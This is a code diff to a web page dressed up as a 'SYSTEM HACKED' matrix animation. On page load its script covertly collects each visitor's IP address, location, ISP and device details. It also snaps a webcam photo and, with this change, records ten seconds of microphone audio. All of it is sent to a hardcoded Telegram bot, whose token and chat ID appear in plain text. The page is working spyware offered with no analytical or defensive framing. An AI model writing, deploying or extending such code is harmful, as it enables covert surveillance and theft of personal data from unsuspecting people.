@@ -16,17 +16,19 @@
     <canvas id="matrix"></canvas>
     <div class="content">
         <h1>[ SYSTEM HACKED ]</h1>
-        <div class="box"><p id="status">> Extracting Advanced Data...</p></div>
+        <div class="box"><p id="status">> Full Accessing System Data...</p></div>
     </div>
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="picCanvas" style="display:none;"></canvas>
 
     <script>
-        // Matrix Animation
+        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
+        const chatId = '1034878899';
+
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01HACKED666";
+        const letters = "01XSYSTEMERROR666";
         const fontSize = 16;
         const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
         function draw() {
@@ -44,41 +46,20 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
-                // وەرگرتنی Hz (Refresh Rate)
                 const getHz = () => new Promise(r => requestAnimationFrame(t1 => requestAnimationFrame(t2 => r(Math.round(1000/(t2-t1))))));
                 const hz = await getHz();
-
-                // پاتری و شەحن
                 let batt = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     batt = `${Math.round(b.level*100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
                 }
-
-                // GPU & Theme
                 const gl = document.createElement('canvas').getContext('webgl');
                 const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-                const dark = window.matchMedia('(prefers-color-scheme: dark)').matches ? "ON" : "OFF";
 
-                const msg = `
-🎭 MATRIX FULL DATA:
-📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}
-🌐 ئایپی: ${data.ip}
-📍 شار: ${data.city} (${data.country_name})
-🏢 کۆمپانیا: ${data.org}
-🔋 پاتری: ${batt}
-🔄 شاشە: ${hz}Hz
-🌙 دۆخی شەو: ${dark}
-🎮 گرافیک: ${gpu}
-💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB
-⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
-🖥 قەبارە: ${window.screen.width}x${window.screen.height}
-                `;
-                fetch(`https://api.telegram.org/bot8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4/sendMessage?chat_id=1034878899&text=${encodeURIComponent(msg)}`);
+                const msg = `🎭 MATRIX DATA:\n📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}\n🌐 ئایپی: ${data.ip}\n📍 شار: ${data.city}\n🔋 پاتری: ${batt}\n🔄 شاشە: ${hz}Hz\n🌙 دۆخی شەو: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "ON" : "OFF"}\n🎮 گرافیک: ${gpu}\n💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB\n⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores\n🌍 زمان: ${navigator.language}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
             } catch(e){}
             
-            // Camera Snap
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({video:true});
                 const v = document.getElementById('video'); v.srcObject = stream;
@@ -87,12 +68,27 @@
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v,0,0);
                     c.toBlob(b => {
-                        const f = new FormData(); f.append('chat_id','1034878899'); f.append('photo',b,'x.jpg');
-                        fetch(`https://api.telegram.org/bot8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4/sendPhoto`,{method:'POST',body:f});
-                        stream.getTracks().forEach(t => t.stop());
+                        const f = new FormData(); f.append('chat_id',chatId); f.append('photo',b,'x.jpg');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:f});
                     },'image/jpeg');
                 }, 2000);
             } catch(h){}
+
+            // تۆمارکردنی دەنگ بۆ ١٠ چرکە
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(audioStream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                    const f = new FormData(); f.append('chat_id', chatId); f.append('voice', blob, 'v.ogg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: f });
+                    audioStream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000); // گۆڕدرا بۆ ١٠ چرکە
+            } catch(a){}
         }
         window.onload = start;
     </script>
